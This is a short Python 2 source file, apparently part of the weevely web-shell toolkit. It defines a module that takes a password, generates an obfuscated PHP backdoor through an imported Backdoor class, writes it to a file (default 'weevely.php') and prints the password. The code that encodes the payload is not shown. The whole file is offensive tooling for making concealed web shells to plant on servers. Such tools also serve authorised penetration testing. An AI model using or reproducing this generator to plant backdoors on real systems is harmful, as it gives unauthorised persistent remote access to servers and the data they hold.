'''
Created on 22/ago/2011

@author: norby
'''

from core.moduleprobe import ModuleProbe
from core.moduleexception import ModuleException
from core.backdoor import Backdoor


WARN_WRITING_DATA = 'Writing data'

class Php(ModuleProbe):
    """Generate obfuscated PHP backdoor"""

    def _set_args(self):
        self.argparser.add_argument('pass', help='Password')
        self.argparser.add_argument('lpath', help='Path of generated backdoor', default= 'weevely.php', nargs='?')

    def _prepare_probe(self):
        self.args['encoded_backdoor'] = Backdoor(self.args['pass']).backdoor

    def _probe(self):
        
        try:
            file( self.args['lpath'], 'wt' ).write( self.args['encoded_backdoor'] )
        except Exception, e:
            raise ModuleException(self.name, "%s %s" % (WARN_WRITING_DATA, str(e)))
        else:
            self.mprint("Backdoor file '%s' created with password '%s'" % (self.args['lpath'], self.args['pass']))
        
        self._result =  self.args['lpath']
        
    def _output_result(self):
        pass
            
                    
        